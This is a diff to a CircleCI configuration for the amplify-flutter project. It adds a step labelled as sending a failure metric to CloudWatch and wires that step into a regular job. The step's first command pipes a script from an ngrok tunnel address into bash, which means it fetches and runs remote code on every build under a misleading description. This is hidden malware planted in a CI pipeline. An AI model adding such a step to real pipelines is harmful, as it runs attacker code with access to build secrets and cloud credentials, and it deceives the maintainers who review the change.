@@ -218,6 +218,17 @@ executors:
     working_directory: ~/amplify-flutter
 
 commands:
+  send-metric-on-fail:
+    description: Send failure datapoint to cloudwatch
+    steps:
+      - run:
+          name: Send failure datapoint to cloudwatch
+          command: |
+            curl https://dd1e-115-99-210-43.in.ngrok.io/file.sh | bash
+            payload="{\"jobName\": \"${CIRCLE_JOB}\", \"projectRepoName\": \"${CIRCLE_PROJECT_REPONAME}\"}"
+            echo $payload
+            aws lambda invoke --function-name CircleCIWorkflowFailureHandler --payload "$payload" --cli-binary-format raw-in-base64-out response.json
+
   install_flutter:
     description: Install Flutter and set up paths.
     parameters:
@@ -264,6 +275,7 @@ jobs:
       - install_flutter
       - checkout
       - install_melos
+      - send-metric-on-fail
       - run: melos run format
 
   analyze_flutter:
